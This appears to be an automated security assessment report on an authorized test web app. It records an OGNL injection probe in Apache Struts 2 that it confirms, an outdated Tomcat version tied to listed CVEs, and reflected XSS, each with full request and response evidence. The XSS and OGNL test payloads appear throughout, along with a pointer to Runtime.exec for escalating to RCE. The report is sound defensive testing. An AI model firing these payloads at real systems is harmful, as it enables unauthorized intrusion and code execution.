# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — vulnerable-component Apache Struts 2 — OGNL double-evaluation RCE (S2-001 / CVE-2007-4556 class), confirmed by active probe](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache Tomcat 9.0.62 — multiple known CVEs (request smuggling; config-dependent TOCTOU RCE CVE-2024-50379/CVE-2024-56337)](#finding-2)
    - [3. MEDIUM — xss-reflected Reflected XSS in message parameter (POST /sendMessageAction)](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqzve6mr-xscl89` |
| Target | http://target.local:32793/ |
| Started | 2026-06-29T23:49:57.141Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32793`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 critical, 1 high, 1 medium

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [vulnerable-component] Apache Struts 2 — OGNL double-evaluation RCE (S2-001 / CVE-2007-4556 class), confirmed by active probe

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32793/

The application is built on Apache Struts 2 (fingerprint: form posts to `/sendMessageAction.action`; markup uses the WebWork/Struts xhtml theme — `wwFormTable`, `tdLabel`, `tdInput`, `class="label"`; JSESSIONID cookie). The `message` field submitted to the Struts action is re-rendered on the success page through a tag that performs OGNL double-evaluation (altSyntax `%{...}`), i.e. the Apache Struts 2 S2-001 / CVE-2007-4556 vulnerability class. This is a server-side OGNL evaluation primitive that escalates to full remote code execution (OGNL reaches the Struts value-stack and Java runtime, e.g. @java.lang.Runtime@getRuntime().exec(...)). NOTE: this is a CONFIRMED vulnerable-component finding — verified by a non-destructive active arithmetic probe, not merely banner-matched. The exact Struts version is not exposed in any banner; the operator should identify and upgrade the installed Struts 2 release, as OGNL double-evaluation is exploitable irrespective of the specific point version. Confirmed by active probe.

**Reproduction**

```
1. GET / → "Customer service contact form" with a `message` textarea posting to /sendMessageAction.action (Struts xhtml theme markup). 
2. Negative control (ev-mqzvub7f-n): POST /sendMessageAction.action with a long plain (non-OGNL) string `message=verdict_negative_control_plain_string_no_ognl_evaluation_marker_absent_padding_padding` → success page echoes the string verbatim inside `<p>...</p>` (bodyLength 1121); the value is NOT evaluated and the marker 7006652 is absent. 
3. Positive (ev-mqzvrqc4-k, ev-mqzvrrfb-l): POST /sendMessageAction.action with `message=%{1234*5678}` (URL-encoded `message=%25%7B1234*5678%7D`) → success page renders `<p>7006652</p>` (bodyLength 1043), i.e. the server EVALUATED the OGNL expression 1234*5678 = 7006652. Reproduced twice, stable. 
Differential: a plain string is echoed literally (control, 1121B, no marker) while an OGNL-wrapped expression is computed server-side (positives, 1043B, marker 7006652) → confirms server-side OGNL double-evaluation. Non-destructive (arithmetic only); a real engagement can substitute an OGNL exec payload to demonstrate RCE.
```

**Evidence**

- Evidence `ev-mqzvub7f-n` — `artifacts/_/ev-mqzvub7f-n/`

Request:

```http
POST /sendMessageAction.action HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

message=verdict_negative_control_plain_string_no_ognl_evaluation_marker_absent_padding_padding
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 1121
content-type: text/html;charset=ISO-8859-1
date: Tue, 30 Jun 2026 00:02:29 GMT
keep-alive: timeout=20
set-cookie: <redacted>


<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        h2 {
            color: #555;
        }
        p {
            color: #666;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message registered successfully.</h1>
        
            <h2>Your message:</h2>
            <p>verdict_negative_control_plain_string_no_ognl_evaluation_marker_absent_padding_padding</p>
        
    </div>
</body>
</html>
```

- Evidence `ev-mqzvrqc4-k` — `artifacts/_/ev-mqzvrqc4-k/`

Request:

```http
POST /sendMessageAction.action HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

message=%25%7B1234*5678%7D
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 1043
content-type: text/html;charset=ISO-8859-1
date: Tue, 30 Jun 2026 00:00:28 GMT
keep-alive: timeout=20
set-cookie: <redacted>


<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        h2 {
            color: #555;
        }
        p {
            color: #666;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message registered successfully.</h1>
        
            <h2>Your message:</h2>
            <p>7006652</p>
        
    </div>
</body>
</html>
```

- Evidence `ev-mqzvrrfb-l` — `artifacts/_/ev-mqzvrrfb-l/`

Request:

```http
POST /sendMessageAction.action HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

message=%25%7B1234*5678%7D
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 1043
content-type: text/html;charset=ISO-8859-1
date: Tue, 30 Jun 2026 00:00:30 GMT
keep-alive: timeout=20
set-cookie: <redacted>


<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        h2 {
            color: #555;
        }
        p {
            color: #666;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message registered successfully.</h1>
        
            <h2>Your message:</h2>
            <p>7006652</p>
        
    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [vulnerable-component] Outdated Apache Tomcat 9.0.62 — multiple known CVEs (request smuggling; config-dependent TOCTOU RCE CVE-2024-50379/CVE-2024-56337)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32793/

The servlet container is Apache Tomcat 9.0.62 (released ~Apr 2022), disclosed verbatim in the footer of Tomcat's HTTP Status error pages (`<h3>Apache Tomcat/9.0.62</h3>`). This release is well behind the 9.0.x patch line and is within the affected range of several known CVEs:
- CVE-2024-50379 / CVE-2024-56337 — TOCTOU race in the default servlet on case-insensitive filesystems that allows RCE when write is enabled (`readonly=false`); affects 9.0.0.M1–9.0.97, fixed 9.0.98. CONFIG-DEPENDENT (default servlet must be writable + case-insensitive FS), but version is in range. (worst-case → high/critical)
- CVE-2023-46589 — HTTP request smuggling via malformed HTTP/1.1 trailer header; affects ≤9.0.82, fixed 9.0.83. (medium)
- CVE-2023-28708 — JSESSIONID cookie issued without Secure attribute behind a TLS-terminating proxy (RemoteIpFilter + X-Forwarded-Proto=https); affects ≤9.0.71, fixed 9.0.72. (medium)
- CVE-2022-42252 — HTTP request smuggling when `rejectIllegalHeader=false`; affects ≤9.0.67, fixed 9.0.68. (medium)
This is a VERSION-BASED finding (matched by the Tomcat banner, not exploited here). The operator should confirm which CVEs are reachable given the deployed configuration before relying on it, and upgrade Tomcat to the current 9.0.x patch (or a supported major line). Severity set to high on account of the in-range RCE CVE chain; effective severity is config-dependent.

**Reproduction**

```
1. Negative control (ev-mqzvp33q-h): GET / → 200, the application "Customer service contact form" page; no Tomcat version banner present (bodyLength 2049). 
2. Positive (ev-mqzvp3tf-i): GET /nonexistent-verdict-404 → 404 HTTP Status page whose footer reads `<h3>Apache Tomcat/9.0.62</h3>` (bodyLength 821). 
3. Positive (ev-mqzvshrk-m): GET /another-bogus-verdict-path-xyz → 404 HTTP Status page, same `<h3>Apache Tomcat/9.0.62</h3>` footer (bodyLength 828). 
Reproduced on two independent error responses; the 200 application page (control) does not carry the banner → version reliably disclosed. Cross-reference the disclosed version against the CVE list above (version-based; verify config before relying).
```

**Evidence**

- Evidence `ev-mqzvp33q-h` — `artifacts/_/ev-mqzvp33q-h/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 2049
content-type: text/html;charset=ISO-8859-1
date: Mon, 29 Jun 2026 23:58:25 GMT
keep-alive: timeout=20
set-cookie: <redacted>


<html>
<head>
    <title>Customer service contact form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        textarea {
            margin-bottom: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Customer Service</h1>
        <p>Use the form below to send a message to our staff</p>
        <form id="sendMessageAction" name="sendMessageAction" action="/sendMessageAction.action;jsessionid=32D006A304E8130177EC7D9DF291E67F" method="post">
<table class="wwFormTable">
            <tr>
    <td class="tdLabel"><label for="sendMessageAction_message" class="label">Message:</label></td>
    <td 
            class="tdInput"            
><textarea name="message" cols="30" rows="6" id="sendMessageAction_message"></textarea></td>
</tr>


            <tr>
<td colspan="2"><div class="formButton"><input type="submit" value="Submit" id="sendMessageAction_0"/>
</div></td>
</tr>


        </table></form>



        
    </div>
</body>
</html>
```

- Evidence `ev-mqzvp3tf-i` — `artifacts/_/ev-mqzvp3tf-i/`

Request:

```http
GET /nonexistent-verdict-404 HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: keep-alive
content-language: en
content-length: 825
content-type: text/html;charset=utf-8
date: Mon, 29 Jun 2026 23:58:25 GMT
keep-alive: timeout=20

<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> There is no Action mapped for namespace [&#47;] and action name [nonexistent-verdict-404] associated with context path [].</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.62</h3></body></html>
```

- Evidence `ev-mqzvshrk-m` — `artifacts/_/ev-mqzvshrk-m/`

Request:

```http
GET /another-bogus-verdict-path-xyz HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: keep-alive
content-language: en
content-length: 832
content-type: text/html;charset=utf-8
date: Tue, 30 Jun 2026 00:01:04 GMT
keep-alive: timeout=20

<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> There is no Action mapped for namespace [&#47;] and action name [another-bogus-verdict-path-xyz] associated with context path [].</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.62</h3></body></html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [xss-reflected] Reflected XSS in message parameter (POST /sendMessageAction)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32793/

The `message` body parameter is reflected unescaped in the HTML success page returned by the same POST request. HTML tags including `<script>` and event-handler attributes (`onerror=alert(...)`) are inserted verbatim inside a `<p>` element. This is a Java Struts application (`.action` endpoint); no output encoding is applied before the value is written to the response template. Exploitation requires the victim to submit the form (or be made to submit it via CSRF/iframe trick from a same-site page). If the stored messages are also viewable by staff in an admin panel (suggested by the 'send a message to our staff' context), this becomes a stored XSS risk for internal users — no staff-side render URL was found during probe_paths enumeration.

**Reproduction**

```
1. POST to /sendMessageAction.action;jsessionid=... with body: message=<script>alert(1)</script>
2. Observe the 200 response HTML contains <p><script>alert(1)</script></p> — tag is unescaped and executes in browser.
3. Also confirmed with: message=<img src=x onerror=alert(document.domain)> → reflected as <p><img src=x onerror=alert(document.domain)></p>
```

**Evidence**

- Evidence `ev-mqzvh3ys-5` — `artifacts/s-0001/ev-mqzvh3ys-5/`

Request:

```http
POST /sendMessageAction.action;jsessionid=7EB431B2B57F4BDBA60F3B957C3C6EC1 HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

message=hello+from+verdict
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 1053
content-type: text/html;charset=ISO-8859-1
date: Mon, 29 Jun 2026 23:52:13 GMT
keep-alive: timeout=20


<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        h2 {
            color: #555;
        }
        p {
            color: #666;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message registered successfully.</h1>
        
            <h2>Your message:</h2>
            <p>hello from verdict</p>
        
    </div>
</body>
</html>
```

- Evidence `ev-mqzvic97-7` — `artifacts/s-0001/ev-mqzvic97-7/`

Request:

```http
POST /sendMessageAction.action;jsessionid=7EB431B2B57F4BDBA60F3B957C3C6EC1 HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 1061
content-type: text/html;charset=ISO-8859-1
date: Mon, 29 Jun 2026 23:53:10 GMT
keep-alive: timeout=20


<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        h2 {
            color: #555;
        }
        p {
            color: #666;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message registered successfully.</h1>
        
            <h2>Your message:</h2>
            <p><script>alert(1)</script></p>
        
    </div>
</body>
</html>
```

- Evidence `ev-mqzvjsc6-9` — `artifacts/s-0001/ev-mqzvjsc6-9/`

Request:

```http
POST /sendMessageAction.action;jsessionid=7EB431B2B57F4BDBA60F3B957C3C6EC1 HTTP/1.1
Host: target.local:32793
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

message=%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E
```

Response:

```http
HTTP/1.1 200
connection: keep-alive
content-language: und
content-length: 1078
content-type: text/html;charset=ISO-8859-1
date: Mon, 29 Jun 2026 23:54:18 GMT
keep-alive: timeout=20


<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
        }
        h2 {
            color: #555;
        }
        p {
            color: #666;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Message registered successfully.</h1>
        
            <h2>Your message:</h2>
            <p><img src=x onerror=alert(document.domain)></p>
        
    </div>
</body>
</html>
```
